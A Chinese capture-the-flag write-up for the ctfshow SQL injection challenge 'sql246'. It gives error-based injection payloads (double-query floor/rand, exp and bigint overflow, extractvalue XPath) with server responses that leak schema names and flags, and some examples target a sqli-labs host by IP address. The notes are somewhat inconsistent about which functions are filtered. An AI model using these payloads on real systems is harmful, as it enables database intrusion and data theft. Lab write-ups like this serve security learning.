# ctfshow-sql246



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623

郁离歌大佬 https://blog.csdn.net/like98k/article/details/79436463



 查询语句 

```
 //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";

```



 返回逻辑 

```
  //无过滤
  过滤updatexml extractvalue
```



```
extractvalue被过滤了，还有双查询报错
sql注入--双查询报错注入
https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html

sqli-labs-Less5 关于各种报错注入的学习
https://blog.csdn.net/rfrder/article/details/108674217

郁离歌大佬
https://blog.csdn.net/like98k/article/details/79436463

利用double 数值类型超出范围进行报错注入
http://43.247.91.228:84/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+
利用bigint 溢出进行报错注入
http://43.247.91.228:84/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+
利用xpath 函数报错注入
http://43.247.91.228:84/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+

不能用group_concat，必须用limit，不知道为什么

发送失败可能为没有成功
多发几次就可以
?id=' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.columns group by a-- -

{"code":0,"msg":"Duplicate entry 'ctfshow_flags~0' for key 'group_key'","count":1,"data":[]}

ctfshow_flags


?id=' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flags' limit 1,1),0x7e,floor(rand()*2))a from information_schema.columns group by a-- -

{"code":0,"msg":"Duplicate entry 'flag2~1' for key 'group_key'","count":1,"data":[]}

flag2


?id=' union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.columns group by a-- -

{"code":0,"msg":"Duplicate entry 'ctfshow{05517471-ebd3-4d87-96a6-3a3d8eecc5a4}~0' for key 'group_key'","count":1,"data":[]}

ctfshow{05517471-ebd3-4d87-96a6-3a3d8eecc5a4}


```







```mysql
extractvalue被过滤了，还有双查询报错

/api
get传参


?id=' or extractvalue(1,concat(0x7e,database(),0x7e))-- -
~ctfshow_web~


因为xpath的报错只有32位，所以需要截取

?id=' or extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1))-- -


{"code":0,"msg":"XPATH syntax error: 'banlist,ctfshow_flagsa,ctfshow_u'","count":1,"data":[]}
少了应该是ctfshow_user
banlist,ctfshow_flagsa,ctfshow_user


?id=' or extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),1))-- -

{"code":0,"msg":"XPATH syntax error: 'id,flag1,info1'","count":1,"data":[]}



?id=' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),1,32),1))-- -

{"code":0,"msg":"XPATH syntax error: 'ctfshow{9d25c68a-6712-4cad-96d3-'","count":1,"data":[]}
ctfshow{9d25c68a-6712-4cad-96d3-

?id=' or extractvalue(1,concat(1,substr((select group_concat(flag1) from ctfshow_flagsa),20,32),1))-- -
{"code":0,"msg":"XPATH syntax error: 'cad-96d3-1e1819039ad5}1'","count":1,"data":[]}


ctfshow{9d25c68a-6712-4cad-96d3-1e1819039ad5}
```























